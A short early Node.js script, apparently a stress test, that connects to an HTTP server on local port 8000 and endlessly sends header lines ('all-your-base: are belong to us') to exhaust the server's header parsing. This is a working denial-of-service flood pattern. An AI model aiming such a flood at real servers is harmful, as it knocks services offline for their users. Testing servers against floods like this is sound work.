var conn = require("tcp").createConnection(8000), sys = require("sys");

sys.debug("waiting for connection...");
conn.forceClose();
conn.addListener("connect", function () {
  sys.debug("connecting...");
  conn.send("GET /lulz HTTP/1.1\r\n");
  conn.addListener("drain", function () { pwn(conn) });
  pwn(conn);
});

var i = 0;
function pwn (conn) {
  var j = 0;
  while (j < 1000000) {
    conn.send("all-your-base: are belong to us.\r\n");
    j++;
  }
  i++;
  sys.puts(i +" million bases pwned");
};

conn.connect(8000);